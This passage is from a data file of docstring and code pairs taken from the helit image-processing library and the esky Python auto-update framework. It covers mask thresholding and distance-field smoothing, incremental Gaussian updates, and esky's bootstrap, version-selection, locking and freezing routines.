x)+1.0)<SIGDIST2(y, x)))\n     {\n      SIGDIST2(y, x) = SIGDIST2(y-1, x) + 1.0;\n      stop = false;\n     }\n     \n     if ((negx)&&(negy)&&((SIGDIST2(y-1, x-1)+sqrt2)<SIGDIST2(y, x)))\n     {\n      SIGDIST2(y, x) = SIGDIST2(y-1, x-1) + sqrt2;\n      stop = false;\n     }\n    }\n   }\n  \n  // Backwards pass...\n   for (int y=Nsigdist[0]-1; y>=0; y--)\n   {\n    for (int x=Nsigdist[1]-1; x>=0; x--)\n    {\n     bool posx = (x+1)!=Nsigdist[1];\n     bool posy = (y+1)!=Nsigdist[0];\n     \n     if ((posx)&&((SIGDIST2(y, x+1)+1.0)<SIGDIST2(y, x)))\n     {\n      SIGDIST2(y, x) = SIGDIST2(y, x+1) + 1.0;\n      stop = false;\n     }\n     \n     if ((posy)&&((SIGDIST2(y+1, x)+1.0)<SIGDIST2(y, x)))\n     {\n      SIGDIST2(y, x) = SIGDIST2(y+1, x) + 1.0;\n      stop = false;\n     }\n     \n     if ((posx)&&(posy)&&((SIGDIST2(y+1, x+1)+sqrt2)<SIGDIST2(y, x)))\n     {\n      SIGDIST2(y, x) = SIGDIST2(y+1, x+1) + sqrt2;\n      stop = false;\n     }\n    }\n   }\n  \"\"\"\n  \n  weave.inline(code, ['sigdist', 'stop'])\n\n## Add in the sign - negate all pixels that are within the mask...\nsigdist[mask] *= -1.0\n\n# Apply a funky smoothing function...\ntemp = sigdist.copy()\nuse = sigdist<16.0 # Don't bother with pixels that are too far from the text.\n\nfor _ in xrange(iters):\n  support = start_cpp() + \"\"\"\n  int comp_float(const void * a, const void * b)\n  {\n   float fa = *(float*)a;\n   float fb = *(float*)b;\n   \n   if (fa<fb) return -1;\n   if (fb<fa) return 1;\n   return 0;\n  }\n  \"\"\"\n  \n  code = start_cpp(support) + \"\"\"\n  // Calculate and store the smoothed version into temp...\n   for (int y=1; y<Nsigdist[0]-1; y++)\n   {\n    for (int x=1; x<Nsigdist[1]-1; x++)\n    {\n     if (USE2(y, x)==0) continue; // Skip pixels that are too far away to care about.\n     \n     static const char dx[8] = {-1,  0,  1, 1, 1, 0, -1, -1};\n     static const char dy[8] = {-1, -1, -1, 0, 1, 1,  1,  0};\n     static const float div[8] = {sqrt(2), 1, sqrt(2), 1, sqrt(2), 1, sqrt(2), 1};\n     \n     // Loop through using a line direction estimated from each set of 3 adjacent neigbours in the 8-way neighbourhood - select the line direction that results in the lowest MAD, using the median of the estimates. The estimates are based on the signed distance of the neighbour offset by the projection distance to the line...\n     \n      float bestMedian = SIGDIST2(y, x);\n      float bestMAD = 1e64;\n     \n      for (int ni=0; ni<8; ni++)\n      {\n       // Estimate the perpendicular to the line direction from the 3 neighbours under consideration - a maximum liklihood mean direction of a Fisher distribution...\n        float nx = 0.0;\n        float ny = 0.0;\n        \n        bool skip = false;\n        for (int oi=0; oi<3; oi++)\n        {\n         int i = (ni+oi) % 8;\n         \n         if (USE2(y + dy[i], x + dx[i])==0)\n         {\n          skip = true;\n          break;\n         }\n        \n         float l = SIGDIST2(y + dy[i], x + dx[i]) - SIGDIST2(y, x);\n         l /= div[i];\n        \n         nx += l * dx[i];\n         ny += l * dy[i];\n        }\n        if (skip) continue;\n       \n       // Normalise the perpendicular to the projection line...\n        float len = sqrt(nx*nx + ny*ny);\n        if (len<1e-3) continue;\n        nx /= len;\n        ny /= len;\n        \n       // Use the proposed line to calculate all 8 estimates...\n        float e[8];\n        for (int i=0; i<8; i++)\n        {\n         float dot = nx * dx[i] + ny * dy[i];\n         e[i] = SIGDIST2(y + dy[i], x + dx[i]) + dot;\n        }\n        \n       // Use the estimates to calculate the median...\n        qsort(e, 8, sizeof(float), comp_float);\n        float median = 0.5 * (e[3] + e[4]);\n       \n       // Mess around and then calculate the MAD...\n        for (int i=0; i<8; i++)\n        {\n         e[i] = fabs(e[i] - median);\n        }\n        \n        qsort(e, 8, sizeof(float), comp_float);\n        float MAD = 0.5 * (e[3] + e[4]);\n       \n       // If its the best MAD thus far record it...\n        if (MAD<bestMAD)\n        {\n         bestMedian = median;\n         bestMAD = MAD;\n        }\n      }\n      \n      TEMP2(y, x) = bestMedian;\n    }\n   }\n  \n  // Copy from temp to the actual signed distance field (Yeah, pointer flipping would make more sense, but no idea how to make a numpy object dance that)...\n   for (int y=1; y<Nsigdist[0]-1; y++)\n   {\n    for (int x=1; x<Nsigdist[1]-1; x++)\n    {\n     SIGDIST2(y, x) = TEMP2(y, x);\n    }\n   }\n  \"\"\"\n  \n  weave.inline(code, ['sigdist', 'temp', 'use'], support_code=support)\n\n# Convert back to a mask and return...\nreturn sigdist<=0.0", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Updates the state given a new sample - sample can have a weight, which obviously defaults to 1, but can be set to other values to indicate repetition of a single point, including fractional.\"\"\"\n", "func_signal": "def add(self, sample, weight=1.0):\n", "code": "sample = numpy.asarray(sample)\n\n# Sample count goes up...\nself.n += weight\n\n# Update mean vector...\ndelta = sample - self.mean\nself.mean += delta*(weight/float(self.n))\n\n# Update scatter matrix (Yes, there is duplicated calculation here as it is symmetric, but who cares?)...\nself.scatter += weight * numpy.outer(delta, sample - self.mean)", "path": "gcp\\gaussian_inc.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Returns the Gaussian distribution calculated so far.\"\"\"\n", "func_signal": "def fetch(self):\n", "code": "ret = Gaussian(self.mean.shape[0])\nret.setMean(self.mean)\nret.setCovariance(self.scatter/float(self.n))\nreturn ret", "path": "gcp\\gaussian_inc.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Given a mask this erodes it repeat times, and returns the new mask. Uses a simple diamond mask, which is the 4 neighbours of each pixel.\"\"\"\n", "func_signal": "def erode(mask, repeat = 1):\n", "code": "ret = mask.copy()\n\nfor _ in xrange(repeat):\n  prev = ret.copy()\n  numpy.logical_and(ret[1:,:], prev[:-1,:], ret[1:,:])\n  numpy.logical_and(ret[:-1,:], prev[1:,:], ret[:-1,:])\n  numpy.logical_and(ret[:,1:], prev[:,:-1], ret[:,1:])\n  numpy.logical_and(ret[:,:-1], prev[:,1:], ret[:,:-1])\n\nreturn ret", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Smooths a mask by repeatedly dilating and then eroding it, the given number of times.\"\"\"\n", "func_signal": "def smooth(mask, repeat = 1):\n", "code": "for _ in xrange(repeat): mask = dilate(mask)\nfor _ in xrange(repeat): mask = erode(mask)\n\nreturn mask", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Given an image, as a numpy array [y,x,c] where c is 0=r, 1=g, 2=b, of type numpy.uint8, and a total percentage, this selects a cuboid of colour space to be the background, everything else foreground. The cuboid is selected by, for each colour channel, calculating the smallest range that includes the given percentage of the pixels. Returns a boolean array, indexed [r,g,b] - this is obviously quite large, as its a 256x256x256 array (16 meg), but it makes applying the threshold easy and supports more complex models for if needed.\"\"\"\n\n# Convert to a total and flatten the image...\n", "func_signal": "def cuboid_bg_model(image, percentage = 50.0):\n", "code": "total = numpy.ceil((percentage/100.0)*image.shape[0]*image.shape[1])\ndata = image.reshape((-1,3))\n\n# For each channel in turn calculate a range...\ncol_ran = []\nfor c in xrange(3):\n  histo = numpy.bincount(data[:,c], minlength=256)\n  cr = tight_total(histo, total)\n  col_ran.append(cr)\n\n# Create the region and mark the ranges selected as being background...\nret = numpy.zeros((256,256,256), dtype=numpy.bool)\n\nret[:col_ran[0][0],:,:] = True\nret[col_ran[0][1]:,:,:] = True\n\nret[:,:col_ran[1][0],:] = True\nret[:,col_ran[1][1]:,:] = True\n\nret[:,:,:col_ran[2][0]] = True\nret[:,:,col_ran[2][1]:] = True\n\nreturn ret", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Given an image (numpy array, [y,x,c] where c is the channel) and a model (boolean array[256,256,256] - True for foreground, False for background.)\"\"\"\n", "func_signal": "def threshold(image, model):\n", "code": "flat = image.reshape((-1,3))\nreturn model[flat[:,0], flat[:,1], flat[:,2]].reshape((image.shape[0],image.shape[1]))", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Initalises the line viewer.\"\"\"\n# Set the line object and setup the cache...\n", "func_signal": "def __init__(self, tile_size=256, cache_size = 1024):\n", "code": "self.set_line(None)\n\n# Store various bits of info...\nself.tile_size = tile_size\nself.cache_size = cache_size\n\n# Which mode to render with...\nself.mode = LineLayer.RENDER_CORRECT\n\n# The colours to use for the line...\nself.colour_zero = (0.0, 0.0, 1.0)\nself.colour_one  = (0.0, 0.0, 0.0)\nself.colour_two  = (1.0, 0.0, 0.0)", "path": "handwriting\\line_graph\\line_layer.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Load and execute the selected version of an application.\n\nThis function replaces the currently-running executable with the equivalent\nexecutable from the given target directory.\n\nOn platforms that support it, this also locks the target directory so that\nit will not be removed by any simultaneously-running instances of the\napplication.\n\"\"\"\n", "func_signal": "def chainload(target_dir):\n", "code": "try:\n    lock_version_dir(target_dir)\nexcept EnvironmentError:\n    #  If the bootstrap file is missing, the version is being uninstalled.\n    #  Our only option is to re-execute ourself and find the new version.\n    if exists(dirname(target_dir)):\n        bsfile = pathjoin(target_dir,ESKY_CONTROL_DIR)\n        bsfile = pathjoin(bsfile,\"bootstrap-manifest.txt\")\n        if not exists(bsfile):\n            execv(sys.executable,list(sys.argv))\n            return\n    raise\nelse:\n    #  If all goes well, we can actually launch the target version.\n    _chainload(target_dir)", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Generate possible locations from which to chainload in the target dir.\"\"\"\n# TODO: let this be a generator when not compiling with PyPy, so we can\n# avoid a few stat() calls in the common case.\n", "func_signal": "def get_exe_locations(target_dir):\n", "code": "locs = []\nappdir = appdir_from_executable(sys.executable)\n#  If we're in an appdir, first try to launch from within \"<appname>.app\"\n#  directory.  We must also try the default scheme for backwards compat.\nif sys.platform == \"darwin\":\n    if basename(dirname(sys.executable)) == \"MacOS\":\n        if __esky_name__:\n            locs.append(pathjoin(target_dir,\n                                 __esky_name__+\".app\",\n                                 sys.executable[len(appdir)+1:]))\n        else:\n            for nm in listdir(target_dir):\n                if nm.endswith(\".app\"):\n                    locs.append(pathjoin(target_dir,\n                                         nm,\n                                         sys.executable[len(appdir)+1:]))\n#  This is the default scheme: the same path as the exe in the appdir.\nlocs.append(target_dir + sys.executable[len(appdir):])\n#  If sys.executable was a backup file, try using original filename.\norig_exe = get_original_filename(sys.executable)\nif orig_exe is not None:\n    locs.append(target_dir + orig_exe[len(appdir):])\nreturn locs", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Get the method resolution order for an object.\n\nIn other words, get the list of classes what are used to look up methods\non the given object, in the order in which they'll be consulted.\n\"\"\"\n", "func_signal": "def _get_mro(obj):\n", "code": "try:\n    return obj.__class__.__mro__\nexcept AttributeError:\n    return _get_oldstyle_mro(obj.__class__,set())", "path": "esky\\sudo\\__init__.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Find the top-level application directory, given sys.executable.\n\nOrdinarily this would simply be the directory containing the executable,\nbut when running via a bundle on OSX the executable will be located at\n<appdir>/Contents/MacOS/<exe>.\n\"\"\"\n", "func_signal": "def appdir_from_executable(exepath):\n", "code": "appdir = dirname(exepath)\nif sys.platform == \"darwin\" and basename(appdir) == \"MacOS\":\n    # Looks like we might be in an app bundle.\n    appdir = dirname(appdir)\n    if basename(appdir) == \"Contents\":\n        # Yep, definitely in a bundle\n        appdir = dirname(appdir)\n    else:\n        # Nope, some other crazy scheme\n        appdir = dirname(exepath)\nreturn appdir", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "#  Reflect the 'name' attribute if it has one, but don't worry\n#  if not.  This helps SudoProxy be re-used on other classes.\n", "func_signal": "def __init__(self,target):\n", "code": "try:\n    self.name = target.name\nexcept AttributeError:\n    pass\nself.target = target\nself.closed = False\nself.pipe = None", "path": "esky\\sudo\\__init__.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Load the named resource from the given file.\n\nThe filename and resource name must be ascii strings, and the resid and\nreslang must be integers.\n\"\"\"\n", "func_signal": "def load_resource(filename,resname,resid,reslang):\n", "code": "l_handle = k32_LoadLibraryExA(filename,rffi.cast(rwin32.HANDLE,0),LOAD_LIBRARY_AS_DATAFILE)\nif not l_handle:\n    raise WindowsError(rwin32.GetLastError(),\"LoadLibraryExW failed\")\ntry:\n    r_handle = k32_FindResourceExA(l_handle,resname,resid,reslang)\n    if not r_handle:\n        raise WindowsError(rwin32.GetLastError(),\"FindResourceExA failed\")\n    r_size = k32_SizeofResource(l_handle,r_handle)\n    if not r_size:\n        raise WindowsError(rwin32.GetLastError(),\"SizeofResource failed\")\n    r_info = k32_LoadResource(l_handle,r_handle)\n    if not r_info:\n        raise WindowsError(rwin32.GetLastError(),\"LoadResource failed\")\n    r_ptr = k32_LockResource(r_info)\n    if not r_ptr:\n        raise WindowsError(rwin32.GetLastError(),\"LockResource failed\")\n    return rffi.charpsize2str(r_ptr,r_size)\nfinally:\n    if not k32_FreeLibrary(l_handle):\n        raise WindowsError(rwin32.GetLastError(),\"FreeLibrary failed\")", "path": "esky\\bdist_esky\\pypy_winres.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Check whether the given directory contains an esky app version.\n\nCurrently it only need contain the \"esky-files/bootstrap-mainfest.txt\" file.\n\"\"\"\n", "func_signal": "def is_version_dir(vdir):\n", "code": "if exists(pathjoin(vdir,ESKY_CONTROL_DIR,\"bootstrap-manifest.txt\")):\n    return True\nreturn False", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Lock the given version dir so it cannot be uninstalled.\"\"\"\n", "func_signal": "def lock_version_dir(vdir):\n", "code": "if sys.platform == \"win32\":\n    #  On win32, we just hold bootstrap file open for reading.\n    #  This will prevent it from being renamed during uninstall.\n    lockfile = pathjoin(vdir,ESKY_CONTROL_DIR,\"bootstrap-manifest.txt\")\n    _locked_version_dirs.setdefault(vdir,[]).append(os_open(lockfile,0,0))\nelse:\n    #  On posix platforms we take a shared flock on esky-files/lockfile.txt.\n    #  While fcntl.fcntl locks are apparently the new hotness, they have\n    #  unfortunate semantics that we don't want for this application:\n    #      * not inherited across fork()\n    #      * released when closing *any* fd associated with that file\n    #  fcntl.flock doesn't have these problems, but may fail on NFS.\n    #  To complicate matters, python sometimes emulates flock with fcntl!\n    #  We therefore use a separate lock file to avoid unpleasantness.\n    lockfile = pathjoin(vdir,ESKY_CONTROL_DIR,\"lockfile.txt\")\n    f = os_open(lockfile,0,0)\n    _locked_version_dirs.setdefault(vdir,[]).append(f)\n    fcntl.flock(f,fcntl.LOCK_SH)", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Local re-implementation of os.path.join.\"\"\"\n", "func_signal": "def pathjoin(*args):\n", "code": "path = args[0]\nfor arg in list(args[1:]):\n    if isabs(arg):\n        path = arg\n    else:\n        while path.endswith(SEP):\n            path = path[:-1]\n        path = path + SEP + arg\nreturn path", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Check whether the given version directory is fully installed.\n\nCurrently, a completed installation is indicated by the lack of an\n\"esky-files/bootstrap\" directory.\n\"\"\"\n", "func_signal": "def is_installed_version_dir(vdir):\n", "code": "if not exists(pathjoin(vdir,ESKY_CONTROL_DIR,\"bootstrap\")):\n    return True\nreturn False", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Get the best usable version directory from inside the given appdir.\n\nIn the common case there is only a single version directory, but failed\nor partial updates can result in several being present.  This function\nfinds the highest-numbered version that is completely installed.\n\"\"\"\n#  Find all potential version directories, sorted by version number.\n", "func_signal": "def get_best_version(appdir,include_partial_installs=False,appname=None):\n", "code": "candidates = []\nfor nm in listdir(appdir):\n    (appnm,ver,platform) = split_app_version(nm)\n    #  If its name didn't parse properly, don't bother looking inside.\n    if ver and platform:\n        #  If we're given a specific name, it must have that name\n        if appname is not None and appnm != appname:\n            continue\n        #  We have to pay another stat() call to check if it's active.\n        if is_version_dir(pathjoin(appdir,nm)):\n            ver = parse_version(ver)\n            candidates.append((ver,nm))\ncandidates = [c[1] for c in sorted(candidates,reverse=True)]\n#  In the (hopefully) common case of no failed updates, we don't need\n#  to poke around in the filesystem so we just return asap.\nif not candidates:\n    return None\nif len(candidates) == 1:\n    return candidates[0]\nif include_partial_installs:\n    return candidates[0]\n#  If there are several candidate versions, we need to find the best\n#  one that is completely installed.\nwhile candidates:\n    nm = candidates.pop(0)\n    if is_installed_version_dir(pathjoin(appdir,nm)):\n        return nm\nreturn None", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Given a backup filename, get the original name to which it refers.\n\nThis is only really possible if the original file actually exists and\nis not guaranteed to be correct in all cases; but unless you do something\nsilly it should work out OK.\n\nIf no matching original file is found, None is returned.\n\"\"\"\n", "func_signal": "def get_original_filename(backname):\n", "code": "filtered = \".\".join([n for n in backname.split(\".\") if n != \"old\"])\nfor nm in listdir(dirname(backname)):\n    if nm == backname:\n        continue\n    if filtered == \".\".join([n for n in nm.split(\".\") if n != \"old\"]):\n        return pathjoin(dirname(backname),nm)\nreturn None", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Freeze the given distribution data using bbfreeze.\"\"\"\n", "func_signal": "def freeze(dist):\n", "code": "includes = dist.includes\nexcludes = dist.excludes\noptions = dist.freezer_options\n#  Merge in any encludes/excludes given in freezer_options\nfor inc in options.pop(\"includes\",()):\n    includes.append(inc)\nfor exc in options.pop(\"excludes\",()):\n    excludes.append(exc)\nif \"pypy\" not in includes and \"pypy\" not in excludes:\n    excludes.append(\"pypy\")\n#  Freeze up the given scripts\nf = bbfreeze.Freezer(dist.freeze_dir,includes=includes,excludes=excludes)\nfor (nm,val) in options.iteritems():\n    setattr(f,nm,val)\nf.addModule(\"esky\")\ntdir = tempfile.mkdtemp()\ntry:\n    for exe in dist.get_executables():\n        f.addScript(exe.script,gui_only=exe.gui_only)\n    if \"include_py\" not in options:\n        f.include_py = False\n    if \"linkmethod\" not in options:\n        #  Since we're going to zip it up, the benefits of hard-\n        #  or sym-linking the loader exe will mostly be lost.\n        f.linkmethod = \"loader\"\n    f()\nfinally:\n    shutil.rmtree(tdir)\n#  Copy data files into the freeze dir\nfor (src,dst) in dist.get_data_files():\n    dst = os.path.join(dist.freeze_dir,dst)\n    dstdir = os.path.dirname(dst)\n    if not os.path.isdir(dstdir):\n        dist.mkpath(dstdir)\n    dist.copy_file(src,dst)\n#  Copy package data into the library.zip\nlib = zipfile.ZipFile(os.path.join(dist.freeze_dir,\"library.zip\"),\"a\")\nfor (src,arcnm) in dist.get_package_data():\n    lib.write(src,arcnm)\nlib.close()\n#  Create the bootstrap code, using custom code if specified.\n#  For win32 we include a special chainloader that can suck the selected\n#  version into the running process rather than spawn a new proc.\ncode_source = [\"__name__ = '__main__'\"]\nesky_name = dist.distribution.get_name()\ncode_source.append(\"__esky_name__ = %r\" % (esky_name,))\ncode_source.append(inspect.getsource(esky.bootstrap))\nif dist.compile_bootstrap_exes:\n    if sys.platform == \"win32\":\n        #  The pypy-compiled bootstrap exe will try to load a python env\n        #  into its own process and run this \"take2\" code to bootstrap.\n        take2_code = code_source[1:]\n        take2_code.append(_CUSTOM_WIN32_CHAINLOADER)\n        take2_code.append(dist.get_bootstrap_code())\n        take2_code = compile(\"\\n\".join(take2_code),\"<string>\",\"exec\")\n        take2_code = marshal.dumps(take2_code)\n        clscript = \"import marshal; \"\n        clscript += \"exec marshal.loads(%r); \" % (take2_code,)\n        clscript = clscript.replace(\"%\",\"%%\")\n        clscript += \"chainload(\\\"%s\\\")\"\n        #  Here's the actual source for the compiled bootstrap exe.\n        from esky.bdist_esky import pypy_libpython\n        code_source.append(inspect.getsource(pypy_libpython))\n        code_source.append(\"_PYPY_CHAINLOADER_SCRIPT = %r\" % (clscript,))\n        code_source.append(_CUSTOM_PYPY_CHAINLOADER)\n    code_source.append(dist.get_bootstrap_code())\n    code_source = \"\\n\".join(code_source)\n    for exe in dist.get_executables(normalise=False):\n        if not exe.include_in_bootstrap_env:\n            continue\n        bsexe = dist.compile_to_bootstrap_exe(exe,code_source)\n        if sys.platform == \"win32\":\n            fexe = os.path.join(dist.freeze_dir,exe.name)\n            winres.copy_safe_resources(fexe,bsexe)\n    #  We may also need the bundled MSVCRT libs\n    if sys.platform == \"win32\":\n        for nm in os.listdir(dist.freeze_dir):\n            if is_core_dependency(nm) and nm.startswith(\"Microsoft\"):\n                dist.copy_to_bootstrap_env(nm)\nelse:\n    if sys.platform == \"win32\":\n        code_source.append(_CUSTOM_WIN32_CHAINLOADER)\n    code_source.append(dist.get_bootstrap_code())\n    code_source.append(\"bootstrap()\")\n    code_source = \"\\n\".join(code_source)\n    #  For non-compiled bootstrap exe, store the bootstrapping code\n    #  into the library.zip as __main__.\n    maincode = imp.get_magic() + struct.pack(\"<i\",0)\n    maincode += marshal.dumps(compile(code_source,\"__main__.py\",\"exec\"))\n    #  Create code for a fake esky.bootstrap module\n    eskycode = imp.get_magic() + struct.pack(\"<i\",0)\n    eskycode += marshal.dumps(compile(\"\",\"esky/__init__.py\",\"exec\"))\n    eskybscode = imp.get_magic() + struct.pack(\"<i\",0)\n    eskybscode += marshal.dumps(compile(\"\",\"esky/bootstrap.py\",\"exec\"))\n    #  Store bootstrap code as __main__ in the bootstrap library.zip.\n    #  The frozen library.zip might have the loader prepended to it, but\n    #  that gets overwritten here.\n    bslib_path = dist.copy_to_bootstrap_env(\"library.zip\")\n    bslib = zipfile.PyZipFile(bslib_path,\"w\",zipfile.ZIP_STORED)\n    cdate = (2000,1,1,0,0,0)\n    bslib.writestr(zipfile.ZipInfo(\"__main__.pyc\",cdate),maincode)\n    bslib.writestr(zipfile.ZipInfo(\"esky/__init__.pyc\",cdate),eskycode)\n    bslib.writestr(zipfile.ZipInfo(\"esky/bootstrap.pyc\",cdate),eskybscode)\n    bslib.close()\n    #  Copy any core dependencies\n    if \"fcntl\" not in sys.builtin_module_names:\n        for nm in os.listdir(dist.freeze_dir):\n            if nm.startswith(\"fcntl\"):\n                dist.copy_to_bootstrap_env(nm)\n    for nm in os.listdir(dist.freeze_dir):\n        if is_core_dependency(nm):\n            dist.copy_to_bootstrap_env(nm)\n    #  Copy the bbfreeze interpreter if necessary\n    if f.include_py:\n        if sys.platform == \"win32\":\n            dist.copy_to_bootstrap_env(\"py.exe\")\n        else:\n            dist.copy_to_bootstrap_env(\"py\")\n    #  Copy the loader program for each script.\n    #  We explicitly strip the loader binaries, in case they were made\n    #  by linking to the library.zip.\n    for exe in dist.get_executables(normalise=False):\n        if not exe.include_in_bootstrap_env:\n            continue\n        exepath = dist.copy_to_bootstrap_env(exe.name)\n        f.stripBinary(exepath)", "path": "esky\\bdist_esky\\f_bbfreeze.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Bootstrap an esky frozen app into the newest available version.\n\nThis function searches the application directory to find the highest-\nnumbered version of the application that is fully installed, then\nchainloads that version of the application.\n\"\"\"\n", "func_signal": "def bootstrap():\n", "code": "sys.executable = abspath(sys.executable)\nappdir = appdir_from_executable(sys.executable)\nvsdir = pathjoin(appdir,ESKY_APPDATA_DIR)\n# TODO: remove compatability hook for ESKY_APPDATA_DIR=\"\".\nbest_version = None\ntry:\n    if __esky_name__:\n        best_version = get_best_version(vsdir,appname=__esky_name__)\n    if best_version is None:\n        best_version = get_best_version(vsdir)\n    if best_version is None:\n        if exists(vsdir):\n            raise RuntimeError(\"no usable frozen versions were found\")\n        else:\n            raise EnvironmentError\nexcept EnvironmentError:\n    if exists(vsdir):\n        raise\n    vsdir = appdir\n    if __esky_name__:\n        best_version = get_best_version(vsdir,appname=__esky_name__)\n    if best_version is None:\n        best_version = get_best_version(vsdir)\n    if best_version is None:\n        raise RuntimeError(\"no usable frozen versions were found\")\nreturn chainload(pathjoin(vsdir,best_version))", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Split an app version string to name, version and platform components.\n\nFor example, app-name-0.1.2.win32 => (\"app-name\",\"0.1.2\",\"win32\")\n\"\"\"\n", "func_signal": "def split_app_version(s):\n", "code": "bits = s.split(\"-\")\nidx = 1\nwhile idx < len(bits):\n    if bits[idx]:\n        if not bits[idx][0].isalpha() or not isalnum(bits[idx]):\n            break\n    idx += 1\nappname = \"-\".join(bits[:idx])\nbits = \"-\".join(bits[idx:]).split(\".\")\nversion = \".\".join(bits[:-1])\nplatform = bits[-1]\nreturn (appname,version,platform)", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Load the named resource from the given file as a python-level string\n\nThe filename and resource name must be ascii strings, and the resid and\nreslang must be integers.\n\nThis uses the given python dll object to load the data directly into \na python string, saving a lot of copying and carrying on.\n\"\"\"\n", "func_signal": "def load_resource_pystr(py,filename,resname,resid,reslang):\n", "code": "l_handle = k32_LoadLibraryExA(filename,rffi.cast(rwin32.HANDLE,0),LOAD_LIBRARY_AS_DATAFILE)\nif not l_handle:\n    raise WindowsError(rwin32.GetLastError(),\"LoadLibraryExW failed\")\ntry:\n    r_handle = k32_FindResourceExA(l_handle,resname,resid,reslang)\n    if not r_handle:\n        raise WindowsError(rwin32.GetLastError(),\"FindResourceExA failed\")\n    r_size = k32_SizeofResource(l_handle,r_handle)\n    if not r_size:\n        raise WindowsError(rwin32.GetLastError(),\"SizeofResource failed\")\n    r_info = k32_LoadResource(l_handle,r_handle)\n    if not r_info:\n        raise WindowsError(rwin32.GetLastError(),\"LoadResource failed\")\n    r_ptr = k32_LockResource(r_info)\n    if not r_ptr:\n        raise WindowsError(rwin32.GetLastError(),\"LockResource failed\")\n    s = py.String_FromStringAndSize(None,r_size)\n    buf = py.String_AsString(s)\n    memcpy(buf,rffi.cast(rffi.VOIDP,r_ptr),r_size)\n    return s\nfinally:\n    if not k32_FreeLibrary(l_handle):\n        raise WindowsError(rwin32.GetLastError(),\"FreeLibrary failed\")", "path": "esky\\bdist_esky\\pypy_winres.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Get a list of all usable version directories inside the given appdir.\n\nThe list will be in order from most-recent to least-recent.  The head\nof the list will be the same directory as returned by get_best_version.\n\"\"\"\n#  Find all potential version directories, sorted by version number.\n", "func_signal": "def get_all_versions(appdir,include_partial_installs=False):\n", "code": "candidates = []\nfor nm in listdir(appdir):\n    (_,ver,platform) = split_app_version(nm)\n    if ver and platform:\n        if is_version_dir(pathjoin(appdir,nm)):\n            ver = parse_version(ver)\n            candidates.append((ver,nm))\ncandidates = [c[1] for c in sorted(candidates,reverse=True)]\n#  Filter out any that are not completely installed.\nif not include_partial_installs:\n    i = 0\n    while i < len(candidates):\n        if not is_installed_version_dir(pathjoin(appdir,candidates[i])):\n            del candidates[i]\n        else:\n            i += 1\nreturn candidates", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Check whether the given version directory is partially uninstalled.\n\nA partially-uninstalled version dir has had the \"bootstrap-manifest.txt\"\nrenamed to \"bootstrap-manifest-old.txt\".\n\"\"\"\n", "func_signal": "def is_uninstalled_version_dir(vdir):\n", "code": "if exists(pathjoin(vdir,ESKY_CONTROL_DIR,\"bootstrap-manifest-old.txt\")):\n    return True\nreturn False", "path": "esky\\bootstrap.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
